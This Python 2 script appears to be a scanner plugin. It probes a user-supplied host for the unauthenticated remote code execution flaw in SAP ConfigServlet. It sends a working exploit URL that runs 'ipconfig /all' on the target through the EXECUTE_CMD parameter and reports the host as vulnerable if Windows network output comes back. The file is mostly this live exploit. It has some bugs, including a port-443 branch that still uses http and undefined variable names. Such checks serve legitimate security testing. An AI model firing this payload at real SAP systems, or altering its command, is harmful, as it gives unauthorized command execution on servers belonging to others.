# sapServletrce.py
# description: checks for SAP ConfigServlet Remote Unauthenticated Remote Code Execution Vulnerability
# reference: http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf
# author: @shipcod3

import sys, urllib

class sapServletrce:

    def __init__(self, core):
        pass

    def run(self):
        print 'Set RHOST:',
        rhost = raw_input()
        print 'Set RPORT:',
        rport = raw_input()
        
        payload = ":50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=ipconfig%20/all"
    
        print "[***] Checking {0} for Remote Code Execution".format(rhost)
    
        if rport == '80':   
            try:  
                url = urllib.urlopen("http://{0}{1}".format(rhost, payload))
                msg = url.read()
    
                if url.code == 200 and "Windows IP Configuration" in msg:
                    print "[!] Vulnerable to Remote Code Execution" 
                    print "[+] Payload: http://{0}{1}\n".format(rhost, payload)

                else:
                    print "[-] Not Vulnerable!"   
    
            except:
                print "[-] Error! Check if host is online..."
                
        if rport == '443':   
            try:  
                url = urllib.urlopen("http://{0}{1}".format(rhost, payload))
                msg = url.read()
    
                if url.code == 200 and "Windows IP Configuration" in msg:
                    print "[!] Vulnerable to Remote Code Execution" 
                    print "[+] Payload: http://{0}{1}\n".format(host, port, payload)

                else:
                    print "[-] Not Vulnerable!"   
    
            except:
                print "[-] Error! Check if host is online..."        